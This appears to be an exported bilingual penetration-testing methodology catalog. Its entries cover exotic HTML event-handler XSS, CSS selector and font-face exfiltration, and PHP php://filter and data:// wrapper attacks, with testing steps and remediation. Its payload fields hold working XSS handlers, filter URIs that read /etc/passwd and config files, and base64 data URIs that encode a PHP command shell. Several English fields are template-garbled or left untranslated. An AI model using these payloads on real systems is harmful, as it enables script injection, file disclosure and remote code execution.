prerequisites.en: The target browser and version support the tested marquee, iframe, object, embed, link, or style event, and resource success or failure conditions are controllable.

prerequisites.zh: 每个事件在独立 fixture 中只调用一次性 marker，资源端点本地可控，并记录事件监听器、readyState 与调用栈。
prerequisites.en: Each event runs in an independent fixture and calls only a one-time marker, resources are locally controlled, and event listeners, ready State, and call stacks are recorded.

title.zh: 事件处理器注入变体

execution.command:
<marquee onstart=alert()>
<iframe onload=alert()>
<object onload=alert()>
<embed onload=alert()>
<link onload=alert()>
<style onload=alert()>

description.zh: 事件处理器注入变体包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Event Handler Variants contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是目标元素在对应浏览器中因预期加载/状态事件调用注入的处理器并执行 marker，事件目标与资源状态一致。 假阳性边界：事件属性保留但浏览器不支持、资源未触发该事件、marker 来自父页面 onload、手工 focus/click 或旧浏览器文档描述都不成立。
analysis.en: Positive evidence requires the target element in the matching browser to call the injected handler on the expected load or state event and execute the marker, with event target and resource state aligned. False-positive boundary: A retained event attribute with unsupported browser behavior, a resource that never triggers the event, a marker from the parent onload, manual focus or click, or old documentation does not qualify.

opsecTips.zh: 低频事件验证限制单元素单事件；出现持续 marquee/media、插件提示、焦点劫持、下载、弹窗循环或外连时停止。
opsecTips.en: Less-common event validation uses one element and event per run; stop on persistent marquee or media, plugin prompts, focus hijacking, downloads, popup loops, or egress.

opsecTips.zh: 移除元素、事件属性和本地资源，停止媒体/动画，清理事件日志与 browser profile，并重载确认无遗留焦点或加载任务。
opsecTips.en: Remove elements, event attributes, and local resources, stop media and animations, clear event logs and browser profiles, and reload to confirm no residual focus or load task.

title.zh: 定位“低频 HTML 事件处理器变体”的输出上下文
title.en: Scope the Less-Common HTML Event Handler Variants data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“富文本消毒器允许这些元素及事件属性，目标浏览器仍实现相应事件，并且 CSP 或资源策略没有阻断必要加载”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that the rich-text sanitizer allows these elements and event attributes, the target browser still implements the event, and CSP or resource policy does not block the required load, and record browser, response-header, and relevant component versions.

title.zh: 建立“浏览器事件兼容性”解析基线
title.en: Establish the Browser Event Compatibility baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“元素支持状态、事件监听记录和唯一执行标记一起保存；不支持或从不触发的历史标签应标为兼容性失败”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only element support, event-listener records, and a unique execution marker are captured together; obsolete tags that never fire are marked as compatibility failures as valid evidence.

title.zh: 逐条重放“低频 HTML 事件处理器变体”样例
title.en: Run a single-variable Less-Common HTML Event Handler Variants check

description.zh: 在应用支持的浏览器矩阵逐一加载元素，分别记录解析、资源请求和事件触发；对需要网络失败的样例使用本地不可达测试地址；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: load each element across the application's supported browser matrix, recording parsing, resource requests, and event firing separately, and use a local unreachable test URL for failure-dependent cases; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<marquee onstart=alert()>
<iframe onload=alert()>
<object onload=alert()>
<embed onload=alert()>
<link onload=alert()>
<style onload=alert()>

title.zh: 修复并回归“低频 HTML 事件处理器变体”
title.en: Retest the Less-Common HTML Event Handler Variants remediation boundary

description.zh: 消毒策略采用最小元素与属性允许列表并统一移除 on* 属性，删除业务不需要的旧元素；用 addEventListener 绑定固定代码而非内联事件；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while element support, event-listener records, and a unique execution marker are captured together; obsolete tags that never fire are marked as compatibility failures no longer appears.

overview.zh: 低频 HTML 事件处理器变体用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：非主流元素的 onload、onstart 等事件是否在目标浏览器版本和实际资源状态下触发，而不是仅被解析进 DOM。测试成立的前提为：富文本消毒器允许这些元素及事件属性，目标浏览器仍实现相应事件，并且 CSP 或资源策略没有阻断必要加载。证据要求为：元素支持状态、事件监听记录和唯一执行标记一起保存；不支持或从不触发的历史标签应标为兼容性失败。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: Less-Common HTML Event Handler Variants checks whether onload, onstart, and related events on less-common elements fire in the target browser and resource state rather than merely appearing in the DOM. It applies when the rich-text sanitizer allows these elements and event attributes, the target browser still implements the event, and CSP or resource policy does not block the required load. A conclusion requires element support, event-listener records, and a unique execution marker are captured together; obsolete tags that never fire are marked as compatibility failures; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：富文本消毒器允许这些元素及事件属性，目标浏览器仍实现相应事件，并且 CSP 或资源策略没有阻断必要加载。审查时必须确认“非主流元素的 onload、onstart 等事件是否在目标浏览器版本和实际资源状态下触发，而不是仅被解析进 DOM”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“元素支持状态、事件监听记录和唯一执行标记一起保存；不支持或从不触发的历史标签应标为兼容性失败”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when the rich-text sanitizer allows these elements and event attributes, the target browser still implements the event, and CSP or resource policy does not block the required load, allowing whether onload, onstart, and related events on less-common elements fire in the target browser and resource state rather than merely appearing in the DOM. Review the input source, final parsing context, browser or policy version, and element support, event-listener records, and a unique execution marker are captured together; obsolete tags that never fire are marked as compatibility failures; otherwise record only an unconfirmed control differential.

exploitation.zh: 在应用支持的浏览器矩阵逐一加载元素，分别记录解析、资源请求和事件触发；对需要网络失败的样例使用本地不可达测试地址。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, load each element across the application's supported browser matrix, recording parsing, resource requests, and event firing separately, and use a local unreachable test URL for failure-dependent cases. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 消毒策略采用最小元素与属性允许列表并统一移除 on* 属性，删除业务不需要的旧元素；用 addEventListener 绑定固定代码而非内联事件。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should use a minimal element and attribute allowlist that removes all on-star attributes, drop obsolete elements not needed by the product, and bind fixed code through add Event Listener instead of inline handlers. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: CSS 属性选择器逐字符外带

description.zh: 按 input[value^=] 前缀规则触发不同 URL 请求，验证攻击者可控样式能否逐字符推断 DOM 属性中的预置测试值。
description.en: Uses input[value^=] prefix rules with distinct request URLs to test whether attacker-controlled styles can infer a planted DOM attribute one character at a time.

prerequisites.zh: 攻击者样式能应用到含合成 input[value] 的 DOM，目标浏览器允许属性前缀选择器和 background URL 请求。
prerequisites.en: Attacker CSS can apply to DOM containing a synthetic input value, and the target browser permits attribute-prefix selectors and background URL requests.

prerequisites.zh: 每个候选字符使用自有唯一令牌，测试值、错误前缀、空值和无样式基线均已准备，并禁用共享缓存。
prerequisites.en: Each candidate character uses an owned unique token, with target value, wrong-prefix, empty-value, and no-style baselines prepared and shared caches disabled.

title.zh: CSS选择器属性外泄
title.en: Validation step 1 for CSS Attribute Selector Character Exfiltration

description.zh: CSS选择器属性外泄包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this CSS Attribute Selector Character Exfiltration validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是仅匹配当前合成前缀的 CSS 规则产生对应 URL 请求，错误前缀不请求，并可在重复测试中逐字符稳定区分。 假阳性边界：所有字符 URL 都被预取、缓存命中、代理/扫描器请求、页面已有 background 或请求无法绑定到具体选择器时均不是侧信道。
analysis.en: Positive evidence requires only the CSS rule matching the current synthetic prefix to emit its URL request, with wrong prefixes silent and repeatable character-by-character discrimination. False-positive boundary: Prefetching all character URLs, cache hits, proxy or scanner requests, existing page backgrounds, or traffic not attributable to a specific selector is not a side channel.

opsecTips.zh: CSS 逐字符测试只使用短合成值和有限字母表，禁止尝试真实密码/token；请求数量异常、真实字段匹配或第三方流量时停止。
opsecTips.en: CSS character testing uses a short synthetic value and limited alphabet and never targets real passwords or tokens; stop on abnormal request volume, real-field matching, or third-party traffic.

opsecTips.zh: 删除全部前缀规则和合成 input，清理样式/浏览器/CDN 缓存，停用字符监听路径并删除令牌映射。
opsecTips.en: Delete all prefix rules and the synthetic input, clear style, browser, and CDN caches, disable character-listener paths, and delete token mappings.

title.zh: 界定“CSS 属性选择器逐字符外带”可控样式范围
title.en: Scope the CSS Attribute Selector Character Exfiltration data flow

description.zh: 确认前提“不可信样式能作用于含敏感 value 属性的同一文档，浏览器允许选择器匹配该属性，并能向测试域发出图片请求”，记录样式作用域、敏感 DOM 隔离、CSP 资源指令和缓存状态。
description.en: Trace the real input to the final sink or policy decision, confirm that untrusted styles apply to the same document as a sensitive value attribute, the browser permits matching that attribute, and image requests can reach the test origin, and record browser, response-header, and relevant component versions.

title.zh: 建立“CSS 选择器侧信道”外连基线
title.en: Establish the CSS Selector Side Channel baseline

description.zh: 先用无条件测试资源确认网络可观察性，再放置已知哨兵值，并按“一次实验只放置一个已知哨兵值，收到的字符 URL 必须与其首字符一致；静态页面缓存和预取需要先排除”判断条件命中。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only each experiment uses one known sentinel value and the requested character URL must match its first character, after excluding page cache and prefetch behavior as valid evidence.

title.zh: 逐条件重放“CSS 属性选择器逐字符外带”
title.en: Run a single-variable CSS Attribute Selector Character Exfiltration check

description.zh: 以随机非敏感字符串设置测试 input value，清理缓存后加载原选择器集合，核对唯一命中的前缀请求；不要针对真实密码或令牌字段；每轮清理缓存并只启用一个字符或属性条件，不接触真实用户数据。
description.en: set a random non-sensitive test input value, clear caches, load the original selector set, and verify the single matching prefix request without targeting real password or token fields; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 阻断样式外带并复测
title.en: Retest the CSS Attribute Selector Character Exfiltration remediation boundary

description.zh: 禁止用户样式进入受信页面，消毒 style 与选择器；敏感值不要写入可匹配 DOM 属性，并用 CSP img-src/style-src 和网络出口限制远程请求；验证合法主题仍可用，同时条件选择器或字体规则无法向非允许域发送请求。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while each experiment uses one known sentinel value and the requested character URL must match its first character, after excluding page cache and prefetch behavior no longer appears.

overview.zh: CSS 属性选择器逐字符外带属于 CSS 条件资源加载侧信道。验证目标为：属性前缀选择器是否能根据隐藏或可见 input 的 value 属性选择性加载背景资源并泄露字符匹配结果。该测试要求：不可信样式能作用于含敏感 value 属性的同一文档，浏览器允许选择器匹配该属性，并能向测试域发出图片请求。有效证据标准为：一次实验只放置一个已知哨兵值，收到的字符 URL 必须与其首字符一致；静态页面缓存和预取需要先排除。无条件字体、图片或样式请求只能证明存在外连，不能证明敏感值已被推断。
overview.en: CSS Attribute Selector Character Exfiltration checks whether attribute-prefix selectors conditionally load background resources based on a hidden or visible input value and reveal character matches. It applies when untrusted styles apply to the same document as a sensitive value attribute, the browser permits matching that attribute, and image requests can reach the test origin. A conclusion requires each experiment uses one known sentinel value and the requested character URL must match its first character, after excluding page cache and prefetch behavior; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 侧信道成立的前提为：不可信样式能作用于含敏感 value 属性的同一文档，浏览器允许选择器匹配该属性，并能向测试域发出图片请求。审计围绕“属性前缀选择器是否能根据隐藏或可见 input 的 value 属性选择性加载背景资源并泄露字符匹配结果”使用预置的非敏感哨兵值，并严格控制缓存、预加载和字体回退。否则，网络请求与字符或属性条件之间无法建立可靠因果关系。
vulnerability.en: The risk exists when untrusted styles apply to the same document as a sensitive value attribute, the browser permits matching that attribute, and image requests can reach the test origin, allowing whether attribute-prefix selectors conditionally load background resources based on a hidden or visible input value and reveal character matches. Review the input source, final parsing context, browser or policy version, and each experiment uses one known sentinel value and the requested character URL must match its first character, after excluding page cache and prefetch behavior; otherwise record only an unconfirmed control differential.

exploitation.zh: 以随机非敏感字符串设置测试 input value，清理缓存后加载原选择器集合，核对唯一命中的前缀请求；不要针对真实密码或令牌字段。先建立无条件资源加载基线，再逐个启用字符或属性条件；每轮清理缓存并记录 Initiator、请求 URL 与已知哨兵值，最终按“一次实验只放置一个已知哨兵值，收到的字符 URL 必须与其首字符一致；静态页面缓存和预取需要先排除”判断条件侧信道是否可重复。
exploitation.en: In an authorized isolated environment, set a random non-sensitive test input value, clear caches, load the original selector set, and verify the single matching prefix request without targeting real password or token fields. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 禁止用户样式进入受信页面，消毒 style 与选择器；敏感值不要写入可匹配 DOM 属性，并用 CSP img-src/style-src 和网络出口限制远程请求。回归分别覆盖合法主题样式、受控字体和原条件规则，确认业务样式仍可加载，而用户样式无法接触敏感 DOM，也不能向非允许域发送选择性请求。
mitigation.en: Remediation should keep user styles out of trusted pages, sanitize style content and selectors, avoid placing secrets in matchable DOM attributes, and restrict remote requests with CSP img-src, style-src, and network egress policy. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: CSS @font-face Unicode 范围外带

description.zh: 利用 @font-face 的 unicode-range 为不同字符配置独立字体 URL，验证页面渲染字符是否可通过条件字体请求被推断。
description.en: Assigns distinct font URLs to character-specific unicode-range descriptors to test whether rendered characters can be inferred from conditional font requests.

prerequisites.zh: 攻击者可注入 @font-face，目标文本包含合成测试字符，浏览器按 unicode-range 选择远程字体且字体加载未被 CSP 阻断。
prerequisites.en: An attacker can inject @font-face, target text contains synthetic test characters, and the browser selects remote fonts by unicode-range without CSP blocking font loads.

prerequisites.zh: 每个字符范围对应自有最小字体 URL 和唯一令牌，配置不含字符、错误范围、本地字体和禁用缓存的负对照。
prerequisites.en: Each character range maps to an owned minimal-font URL and unique token, with absent-character, wrong-range, local-font, and cache-disabled negative controls.

title.zh: CSS @font-face外泄
title.en: Validation step 1 for CSS Font-Face Unicode-Range Exfiltration

description.zh: CSS @font-face外泄包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this CSS Font-Face Unicode-Range Exfiltration validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是渲染特定合成字符时只请求覆盖其 unicode-range 的字体令牌，字符移除或范围改变后请求消失，且事件来自目标浏览器。 假阳性边界：浏览器预加载全部字体、fallback 或缓存请求、安全扫描器抓取 CSS、字体 404 重试或请求与页面字符无条件相关均不能证明泄露。
analysis.en: Positive evidence requires rendering a synthetic character to request only the font token covering its unicode-range, with the request disappearing when the character or range changes and originating from the target browser. False-positive boundary: Browser preloading of all fonts, fallback or cached requests, scanner CSS fetches, font 404 retries, or requests unrelated to page characters does not prove leakage.

opsecTips.zh: unicode-range 测试只使用少量合成字符和最小字体，禁止扫描真实页面秘密；出现字体请求风暴、公共源访问或性能下降时停止。
opsecTips.en: Unicode-range testing uses a few synthetic characters and minimal fonts only and never scans real page secrets; stop on font-request storms, public-origin access, or performance degradation.

opsecTips.zh: 移除 @font-face 和合成文本，清理字体/CSS/浏览器缓存，关闭字体端点并删除请求令牌与临时字体文件。
opsecTips.en: Remove @font-face rules and synthetic text, clear font, CSS, and browser caches, close font endpoints, and delete request tokens and temporary font files.

title.zh: 界定“CSS @font-face Unicode 范围外带”可控样式范围
title.en: Scope the CSS Font-Face Unicode-Range Exfiltration data flow

description.zh: 确认前提“攻击者能够注入 @font-face 并将自定义字体应用到目标文本，CSP 允许外部 font-src，且敏感字符真实参与布局和字体选择”，记录样式作用域、敏感 DOM 隔离、CSP 资源指令和缓存状态。
description.en: Trace the real input to the final sink or policy decision, confirm that an attacker can inject font-face rules and apply the custom font to target text, CSP permits external font-src, and the sensitive character participates in layout and font selection, and record browser, response-header, and relevant component versions.

title.zh: 建立“CSS 字体加载侧信道”外连基线
title.en: Establish the CSS Font Loading Side Channel baseline

description.zh: 先用无条件测试资源确认网络可观察性，再放置已知哨兵值，并按“使用已知哨兵文本时仅收到对应 unicode-range 的字体请求，并在清缓存和禁用预加载后仍可重复，才证明条件侧信道”判断条件命中。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only only font requests matching known sentinel text, reproducible after cache clearing and with preload disabled, prove the conditional side channel as valid evidence.

title.zh: 逐条件重放“CSS @font-face Unicode 范围外带”
title.en: Run a single-variable CSS Font-Face Unicode-Range Exfiltration check

description.zh: 在隔离页渲染固定的 A、B、C 与数字哨兵文本，加载原 @font-face 集合并记录字体网络请求；比较未应用自定义字体的对照页面；每轮清理缓存并只启用一个字符或属性条件，不接触真实用户数据。
description.en: render fixed A, B, C, and numeric sentinel text in an isolated page, load the original font-face set, record font requests, and compare against a control page without the custom font; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 阻断样式外带并复测
title.en: Retest the CSS Font-Face Unicode-Range Exfiltration remediation boundary

description.zh: 禁止不可信 @font-face 和任意字体 URL，收紧 CSP font-src/style-src，敏感文本使用隔离渲染且不允许用户样式作用于同一 DOM；验证合法主题仍可用，同时条件选择器或字体规则无法向非允许域发送请求。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while only font requests matching known sentinel text, reproducible after cache clearing and with preload disabled, prove the conditional side channel no longer appears.

overview.zh: CSS @font-face Unicode 范围外带属于 CSS 条件资源加载侧信道。验证目标为：浏览器是否只在页面实际使用某个 Unicode 码位时请求对应字体资源，从而向外部观察者暴露字符集合。该测试要求：攻击者能够注入 @font-face 并将自定义字体应用到目标文本，CSP 允许外部 font-src，且敏感字符真实参与布局和字体选择。有效证据标准为：使用已知哨兵文本时仅收到对应 unicode-range 的字体请求，并在清缓存和禁用预加载后仍可重复，才证明条件侧信道。无条件字体、图片或样式请求只能证明存在外连，不能证明敏感值已被推断。
overview.en: CSS Font-Face Unicode-Range Exfiltration checks whether the browser requests a font resource only when the page uses a corresponding Unicode code point, exposing the rendered character set to an external observer. It applies when an attacker can inject font-face rules and apply the custom font to target text, CSP permits external font-src, and the sensitive character participates in layout and font selection. A conclusion requires only font requests matching known sentinel text, reproducible after cache clearing and with preload disabled, prove the conditional side channel; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 侧信道成立的前提为：攻击者能够注入 @font-face 并将自定义字体应用到目标文本，CSP 允许外部 font-src，且敏感字符真实参与布局和字体选择。审计围绕“浏览器是否只在页面实际使用某个 Unicode 码位时请求对应字体资源，从而向外部观察者暴露字符集合”使用预置的非敏感哨兵值，并严格控制缓存、预加载和字体回退。否则，网络请求与字符或属性条件之间无法建立可靠因果关系。
vulnerability.en: The risk exists when an attacker can inject font-face rules and apply the custom font to target text, CSP permits external font-src, and the sensitive character participates in layout and font selection, allowing whether the browser requests a font resource only when the page uses a corresponding Unicode code point, exposing the rendered character set to an external observer. Review the input source, final parsing context, browser or policy version, and only font requests matching known sentinel text, reproducible after cache clearing and with preload disabled, prove the conditional side channel; otherwise record only an unconfirmed control differential.

exploitation.zh: 在隔离页渲染固定的 A、B、C 与数字哨兵文本，加载原 @font-face 集合并记录字体网络请求；比较未应用自定义字体的对照页面。先建立无条件资源加载基线，再逐个启用字符或属性条件；每轮清理缓存并记录 Initiator、请求 URL 与已知哨兵值，最终按“使用已知哨兵文本时仅收到对应 unicode-range 的字体请求，并在清缓存和禁用预加载后仍可重复，才证明条件侧信道”判断条件侧信道是否可重复。
exploitation.en: In an authorized isolated environment, render fixed A, B, C, and numeric sentinel text in an isolated page, load the original font-face set, record font requests, and compare against a control page without the custom font. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 禁止不可信 @font-face 和任意字体 URL，收紧 CSP font-src/style-src，敏感文本使用隔离渲染且不允许用户样式作用于同一 DOM。回归分别覆盖合法主题样式、受控字体和原条件规则，确认业务样式仍可加载，而用户样式无法接触敏感 DOM，也不能向非允许域发送选择性请求。
mitigation.en: Remediation should disallow untrusted font-face rules and arbitrary font URLs, tighten CSP font-src and style-src, and render sensitive text in an isolated context not reachable by user styles. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: PHP Filter 源码读取边界

description.zh: 使用七个原始 php://filter 变体验证文件读取入口是否允许过滤器对目标资源编码，并把源码读取与普通文件响应区分开。
description.en: Uses seven original php://filter variants to verify whether a file-reading sink permits filtered encoding of a target resource and distinguishes source disclosure from an ordinary file response.

prerequisites.zh: 已确认参数进入 fopen、file_get_contents、include 或 require 之一，并记录具体 API
prerequisites.en: The parameter is confirmed to reach fopen, file_get_contents, include, or require, and the exact API is recorded.

prerequisites.zh: 隔离环境提供仅含随机标记的 PHP 文件，且可关联应用日志与文件审计
prerequisites.en: The isolated environment provides a PHP file containing only a random marker, with correlated application and file-audit logs.

title.zh: PHP Filter Base64 读取变体

description.zh: 逐行替换为隔离标记文件后提交，记录原始 URI、规范路径、过滤器选择和响应；不得读取系统或业务文件。
description.en: Submit one line at a time after substituting the isolated marker file, recording the raw URI, canonical path, selected filter, and response; never read system or business files.

analysis.zh: 确认边界要求同一请求同时具备 filter 被实际处理、应用进程读取隔离文件、响应可还原随机标记三项证据。仅看到 Base64 字符、PHP 警告或 URI 回显都不是源码泄露。
analysis.en: Confirmation requires three correlated facts in one request: the filter was processed, the application process read the isolated file, and the response reconstructs the random marker. Base64 characters, PHP warnings, or URI reflection alone do not prove source disclosure.

opsecTips.zh: 所有资源路径先改为随机标记文件；若返回真实源码或系统内容立即停止并保留请求 ID
opsecTips.en: Replace every resource path with the random-marker file first; stop immediately and retain the request identifier if real source or system content appears.

opsecTips.zh: 完成后删除标记文件、解码副本和临时日志导出，并复核没有访问原始敏感路径
opsecTips.en: Afterward delete the marker file, decoded copies, and temporary log exports, and verify that no original sensitive path was accessed.

title.zh: 确认读取函数与标记文件
title.en: Confirm the read function and marker file

description.zh: 记录最终 PHP 文件 API、运行身份和固定根目录，并准备只含随机标记的无敏感文件。
description.en: Record the final PHP file API, runtime identity, and configured root, then prepare a nonsensitive file containing only a random marker.

title.zh: 逐条提交 Filter 变体

description.zh: 每次只测试一个保留的原始变体，并把资源部分替换为隔离标记文件。
description.en: Test one preserved source variant per request and replace its resource component with the isolated marker file.

attackChain.payload:
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://filter/read=convert.base64-encode/resource=config.php
php://filter/read=convert.base64-encode/resource=../config.php
php://filter/read=convert.base64-encode/resource=../../config.php
php://filter/convert.base64-encode/resource=index.php

title.zh: 关联解码结果与文件读取
title.en: Correlate decoded output with the file read

description.zh: 将响应解码值、规范路径、请求 ID 和文件审计事件关联，排除代理编码和错误回显。
description.en: Correlate decoded response data, canonical path, request identifier, and file-audit event while excluding proxy encoding and error reflection.

title.zh: 限制 Scheme 并回归

description.zh: 改为对象映射与根目录校验后重放正常读取和七个变体，确认业务文件可读而 filter URI 被拒绝。
description.en: After object mapping and root validation, replay the normal read and seven variants to confirm business files remain available while filter URIs are rejected.

overview.zh: php://filter 可在 PHP 流进入调用方之前应用编码或转换。这里的目标是确认读取函数是否越过预期文件对象边界返回标记源码，而不是把出现 Base64 文本直接当作漏洞。
overview.en: php://filter 可在 PHP 流进入调用方之前应用编码或转换。这里的目标是确认读取函数是否越过预期文件对象边界返回标记源码，而不是把出现 Base64 文本直接当作漏洞。

vulnerability.zh: 当用户控制的资源 URI 进入读取或包含 API，且没有固定根目录、对象映射和 scheme 限制时，过滤器可能暴露本应由解释器执行的源码。过滤器被识别、URI 被回显或目标文件不存在都不足以确认。
vulnerability.en: When a user-controlled resource URI reaches a read or include API without a fixed root, object mapping, and scheme restriction, a filter may disclose source that should have been interpreted. Filter recognition, URI reflection, or a missing-file error is insufficient evidence.

exploitation.zh: 先用合法对象 ID 读取随机标记文件建立基线，再逐条提交改写后的 filter URI。只有响应可解码为该标记且文件审计显示应用进程读取了规范化目标时算阳性；网关编码、静态样例或错误页是假阳性。
exploitation.en: Establish a baseline by reading the random-marker file through its valid object identifier, then submit each rewritten filter URI separately. A positive requires a response decoding to that marker plus file-audit evidence that the application process read the canonical target; gateway encoding, static examples, and error pages are false positives.

mitigation.zh: 将外部输入映射为服务端对象 ID，在固定根目录内解析并验证真实路径，拒绝非 file scheme，且禁止用户数据进入 include/require。修复后同时重放合法对象、越界路径和全部 filter 变体。
mitigation.en: 将外部输入映射为服务端对象 ID，在固定根目录内解析并验证真实路径，拒绝非 file scheme，且禁止用户数据进入 include/require。修复后同时重放合法对象、越界路径和全部 filter 变体。

name.zh: PHP Data Wrapper 包含边界

description.zh: 保留两条 data:// 内联流样例，用于区分普通流读取与 allow_url_include 条件下的服务端代码解释。
description.en: 保留两条 data:// 内联流样例，用于区分普通流读取与 allow_url_include 条件下的服务端代码解释。

prerequisites.zh: 已通过代码跟踪确认输入到达 include 或 require，而不是仅到达读取或回显函数
prerequisites.en: Code tracing confirms that input reaches include or require rather than only a read or reflection function.

prerequisites.zh: 已记录 allow_url_fopen、allow_url_include 和 data wrapper 状态，并使用无副作用标记脚本
prerequisites.en: allow_url_fopen, allow_url_include, and data-wrapper status are recorded, and a side-effect-free marker script is used.

title.zh: Data Wrapper Base64 流

description.zh: 原字节仅用于追溯。实际测试重编码为只设置请求内随机标记的 PHP 片段，每次提交一条且不运行命令、不读取文件。
description.en: The original bytes are retained only for traceability. For testing, re-encode a PHP fragment that sets only a request-local random marker, submit one line at a time, and execute no command or file read.

analysis.zh: 有效发现必须证明 data 流进入 include/require 并被 PHP 解释为无副作用标记。仅能读取 URI 数据、返回编码文本、触发 warning 或看到 cmd 参数并不能证明代码执行。
analysis.en: A valid finding proves that the data stream reached include or require and PHP interpreted the side-effect-free marker. Reading URI data, returning encoded text, triggering a warning, or observing a cmd parameter does not prove code execution.

opsecTips.zh: 不得直接执行原始 system 或文件读取内容；先离线解码审查，再替换为单值随机标记
opsecTips.en: Never execute the original system or file-reading content; decode and inspect it offline first, then replace it with a one-value random marker.

opsecTips.zh: 一旦标记被解释即停止，清除 opcode/cache、请求日志中的编码片段和临时测试模板
opsecTips.en: Stop when the marker is interpreted and clear opcode or application caches, encoded fragments in request logs, and temporary test templates.

title.zh: 记录 URL Include 配置

description.zh: 确认最终调用为 include/require，并保存 PHP 版本、wrapper 列表和两个相关 ini 设置。
description.en: Confirm the final call is include or require and preserve the PHP version, wrapper list, and both relevant ini settings.

title.zh: 改写为无副作用标记并提交
title.en: Rewrite to a side-effect-free marker and submit

description.zh: 保持 data URI 形态但替换原始代码，每次只提交一条并绑定唯一请求 ID。
description.en: Preserve the data-URI shape while replacing the original code, submitting one line per unique request identifier.

attackChain.payload:
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
data://text/plain;base64,PD9waHAgZWNobyhmaWxlX2dldF9jb250ZW50cygnL2V0Yy9wYXNzd2QnKSk7ID8%2B&cmd=id

title.zh: 证明解释而非文本读取
title.en: Prove interpretation rather than text reading

description.zh: 同时核对 include 跟踪与随机标记输出，排除源码回显、Base64 解码和错误页。
description.en: Correlate include tracing with random-marker output, excluding source reflection, Base64 decoding, and error pages.

title.zh: 关闭 URL Include 并清理
title.en: Disable URL inclusion and clean up

description.zh: 切换到模板映射后回归合法路由和 data URI，随后删除测试片段、缓存和标记日志。
description.en: After switching to template mapping, regress valid routes and data URIs, then delete test fragments, caches, and marker-bearing logs.

overview.zh: data:// 把 URI 中的数据暴露为流；读取流与把流交给 PHP include 是两个不同安全结果。测试必须先识别最终函数和配置，不能从 payload 内含 PHP 标签推断已执行。
overview.en: data:// exposes URI-embedded data as a stream; reading that stream and passing it to PHP include are different security outcomes. Testing must identify the final function and configuration before inferring anything from PHP tags in the payload.

vulnerability.zh: 用户输入进入 include/require 且 URL include 被启用时，内联流可能被解释为服务器端代码。若仅由 file_get_contents 读取、作为文本回显或被配置拒绝，则不构成代码执行。
vulnerability.en: 用户输入进入 include/require 且 URL include 被启用时，内联流可能被解释为服务器端代码。若仅由 file_get_contents 读取、作为文本回显或被配置拒绝，则不构成代码执行。

exploitation.zh: 用只设置内存布尔值并输出随机标记的片段替换原始危险内容，先测试合法 include 基线，再逐条提交。阳性要求应用日志显示 include 路径且响应出现唯一标记；解码成功、PHP 源码回显或统一 500 均为阴性。
exploitation.en: 用只设置内存布尔值并输出随机标记的片段替换原始危险内容，先测试合法 include 基线，再逐条提交。阳性要求应用日志显示 include 路径且响应出现唯一标记；解码成功、PHP 源码回显或统一 500 均为阴性。

mitigation.zh: 禁止外部输入控制 include/require，关闭不需要的 allow_url_include，并用明确路由映射加载固定模板。回归应证明合法模板继续工作，同时 data scheme 在解释前被拒绝。
mitigation.en: Prevent external input from controlling include or require, disable unnecessary allow_url_include, and load fixed templates through explicit route mappings. Regression should preserve valid templates while rejecting the data scheme before interpretation.

name.zh: PHP Expect Wrapper 扩展边界

